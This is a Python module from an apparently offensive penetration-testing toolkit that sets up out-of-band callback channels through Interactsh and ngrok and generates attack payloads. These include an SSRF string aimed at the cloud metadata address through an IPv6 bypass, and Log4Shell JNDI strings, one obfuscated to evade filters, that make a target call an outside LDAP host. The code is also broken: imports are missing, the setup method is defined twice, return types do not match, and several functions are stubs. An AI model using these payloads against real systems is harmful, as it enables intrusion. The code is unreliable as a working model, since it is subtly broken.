from __future__ import annotations
import asyncio
import httpx
import hashlib
import time
from pydantic import BaseModel
from typing import Optional, Literal, List, Callable, Dict, Any
from pentkit.core.session import Session

logger = logging.getLogger(__name__)

class OOBInteraction(BaseModel):
    protocol: str
    source_ip: str
    data: str
    timestamp: str

class OOBProfile(BaseModel):
    http_url: Optional[str] = None
    dns_domain: Optional[str] = None
    smtp_address: Optional[str] = None
    channel: Literal["interactsh", "collaborator", "ngrok", "dns", "timing"]
    poll_fn: Optional[Callable] = None
    config: Dict[str, Any] = {}

class CallbackQueue:
    """
    Persistent queue for OOB callbacks.
    Matches late-arriving callbacks to findings.
    """
    def __init__(self, session: Optional[Session] = None):
        self.session = session
        self.queue = asyncio.Queue()
        self.seen_hashes = set()
        self._pending: Dict[str, Dict] = {} # finding_id -> metadata

    async def push(self, interaction: OOBInteraction):
        # Deduplicate
        data_hash = hashlib.sha256(f"{interaction.protocol}{interaction.data}".encode()).hexdigest()
        if data_hash not in self.seen_hashes:
            self.seen_hashes.add(data_hash)
            await self.queue.put(interaction)
            # Try to match immediately if we have a session
            if self.session:
                await self._match_interaction(interaction)

    async def register(self, finding_id: str, payload_url: str, ttl_minutes: int = 60):
        """Register a finding as expecting an OOB callback."""
        self._pending[finding_id] = {
            "payload_url": payload_url,
            "registered_at": time.time(),
            "ttl": ttl_minutes * 60,
            "matched": False
        }

    async def _match_interaction(self, interaction: OOBInteraction):
        """Match interaction data against pending finding IDs."""
        for fid, meta in self._pending.items():
            if meta["matched"]: continue
            
            # Check if finding_id is in the interaction data (e.g. URL path)
            if fid in interaction.data:
                logger.info(f"OOB callback matched for finding {fid}")
                meta["matched"] = True
                if self.session:
                    # Upgrade finding in DB
                    # In a real tool, we'd fetch the finding and update it
                    self.session.add_finding(
                        module="core.oob_listener",
                        target="OOB Channel",
                        title=f"OOB Callback Confirmed: {fid}",
                        description=f"Confirmed interaction from {interaction.source_ip} via {interaction.protocol}.",
                        severity="high",
                        details={"interaction": interaction.model_dump()},
                        tags=["oob", "confirmed"]
                    )

    async def get_all(self) -> List[OOBInteraction]:
        items = []
        while not self.queue.empty():
            items.append(await self.queue.get())
        return items

class OOBOrchestrator:
    """
    Manages multiple OOB channels simultaneously.
    Automatically selects the right channel based on what reaches the target.
    """

    def __init__(self, session: Optional[Session] = None):
        self.session = session
        self.interactsh_token = None
        self.interactsh_secret = None
        self.interactsh_domain = None
        self.ngrok_process = None
        self.ngrok_url = None
        self.callback_queue = CallbackQueue(session)
        self.active_profile: Optional[OOBProfile] = None
        self._poller_task: Optional[asyncio.Task] = None

    async def setup(self, session: Session) -> OOBProfile:
        self.session = session
        self.callback_queue.session = session
        
        # Establishing OOB infrastructure
        profile = await self._setup_interactsh()
        if not profile:
            profile = await self._setup_ngrok()
        
        if not profile:
            profile = OOBProfile(channel="timing")
            
        self.active_profile = profile
        
        # Start background poller if we have a poll function
        if profile.poll_fn:
            self._poller_task = asyncio.create_task(self._run_background_poller())
            
        return profile

    async def _run_background_poller(self):
        """Background task to poll OOB channel."""
        logger.info("Starting OOB background poller")
        while True:
            try:
                if self.active_profile and self.active_profile.poll_fn:
                    interactions = await self.active_profile.poll_fn()
                    for inter in interactions:
                        await self.callback_queue.push(inter)
            except Exception as e:
                logger.debug(f"OOB Poller error: {e}")
            await asyncio.sleep(10)

    async def verify_callback(self, finding_id: str, timeout: int = 30) -> Optional[OOBInteraction]:
        """
        Wait for a specific finding_id to appear in the callback queue.
        Enables high-fidelity confirmation of SSRF/XXE/RCE.
        """
        logger.info(f"Waiting for OOB callback for finding {finding_id}...")
        start = time.time()
        while time.time() - start < timeout:
            # Check queue for finding_id
            # Note: CallbackQueue already matches in the background via push()
            # We can check the matched status in pending
            if finding_id in self.callback_queue._pending and self.callback_queue._pending[finding_id]["matched"]:
                return True # Simplified
            
            await asyncio.sleep(2)
        return None

    async def setup(self, session: Session) -> OOBProfile:
        """
        Establish OOB infrastructure in priority order:
        1. Interactsh
        2. Burp Collaborator (placeholder for now)
        3. ngrok
        4. DNS-only
        5. Timing-based fallback
        """
        # Priority 1: Interactsh
        try:
            profile = await self._setup_interactsh()
            if profile:
                logger.info(f"OOB channel: Interactsh ({profile.http_url})")
                return profile
        except Exception as e:
            logger.debug(f"Interactsh setup failed: {e}")

        # Priority 3: ngrok
        try:
            profile = await self._setup_ngrok()
            if profile:
                logger.info(f"OOB channel: ngrok ({profile.http_url})")
                return profile
        except Exception as e:
            logger.debug(f"ngrok setup failed: {e}")

        # Fallback: Timing-based (no real OOB)
        logger.info("OOB channel: timing (fallback)")
        return OOBProfile(channel="timing")

    async def _setup_interactsh(self) -> Optional[OOBProfile]:
        """Register with Interactsh API."""
        async with httpx.AsyncClient(timeout=10.0) as client:
            try:
                # Basic registration — in a real case, we'd need more complex key exchange
                # This is a simplified version.
                response = await client.post("https://app.interactsh.com/api/v1/register", json={})
                if response.status_code == 200:
                    data = response.json()
                    self.interactsh_token = data.get('token')
                    self.interactsh_secret = data.get('secret')
                    self.interactsh_domain = f"{self.interactsh_token}.oast.fun"
                    
                    return OOBProfile(
                        http_url=f"http://{self.interactsh_domain}",
                        dns_domain=self.interactsh_domain,
                        channel="interactsh",
                        poll_fn=self._poll_interactsh
                    )
            except Exception:
                pass
        return None

    async def _poll_interactsh(self) -> List[OOBInteraction]:
        """Poll interactsh for interactions."""
        if not self.interactsh_token or not self.interactsh_secret:
            return []
            
        async with httpx.AsyncClient(timeout=10.0) as client:
            try:
                url = f"https://app.interactsh.com/api/v1/poll?id={self.interactsh_token}&secret={self.interactsh_secret}"
                response = await client.get(url)
                if response.status_code == 200:
                    data = response.json()
                    interactions = []
                    for interaction in data.get('interactions', []):
                        interactions.append(OOBInteraction(
                            protocol=interaction.get('protocol'),
                            source_ip=interaction.get('remote_address'),
                            data=interaction.get('raw_request', ''),
                            timestamp=interaction.get('timestamp')
                        ))
                    return interactions
            except Exception:
                pass
        return []

    async def _setup_ngrok(self) -> Optional[OOBProfile]:
        """Set up ngrok tunnel for local OOB server."""
        if not shutil.which("ngrok"):
            return None

        try:
            # Start local server on random port
            port = 45678 # simplified
            # Start ngrok
            self.ngrok_process = subprocess.Popen(
                ["ngrok", "http", str(port), "--log=stdout"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            # Give it time to start
            await asyncio.sleep(5)
            
            # Query ngrok API for public URL
            async with httpx.AsyncClient(timeout=5.0) as client:
                response = await client.get("http://localhost:4040/api/tunnels")
                if response.status_code == 200:
                    data = response.json()
                    self.ngrok_url = data['tunnels'][0]['public_url']
                    return OOBProfile(
                        http_url=self.ngrok_url,
                        channel="ngrok",
                        poll_fn=self._poll_local_logs # in real case, local server logs
                    )
        except Exception:
            if self.ngrok_process:
                self.ngrok_process.terminate()
        return None

    async def _poll_local_logs(self) -> List[OOBInteraction]:
        # Implementation for reading local OOB server logs
        return []

    async def probe_egress(self, target_url: str, oob: OOBProfile) -> Dict[str, bool]:
        """Probe which protocols reach the target."""
        # Simplified egress map
        egress_map = {"http": False, "https": False, "dns": False}
        if oob.channel == "timing":
            return egress_map
            
        # Send probes and check OOB
        # ... implementation ...
        return egress_map

    async def generate_payload(self, oob: OOBProfile, finding_id: str, payload_type: str) -> List[str]:
        """Generate OOB payloads based on available channels."""
        if oob.channel == "timing":
            return []
            
        base_url = oob.http_url
        payloads = []
        if payload_type == "ssrf":
            payloads.append(f"{base_url}/{finding_id}")
            payloads.append(f"http://[::ffff:a9fe:a9fe]/{finding_id}") # IPv6 bypass
        elif payload_type == "log4shell":
            payloads.append(f"${{jndi:ldap://{oob.dns_domain}/{finding_id}}}")
            payloads.append(f"${{${{lower:j}}ndi:${{lower:l}}dap://{oob.dns_domain}/{finding_id}}}")
            
        return payloads

from pydantic import BaseModel
__all__ = ["OOBOrchestrator", "OOBProfile", "OOBInteraction"]
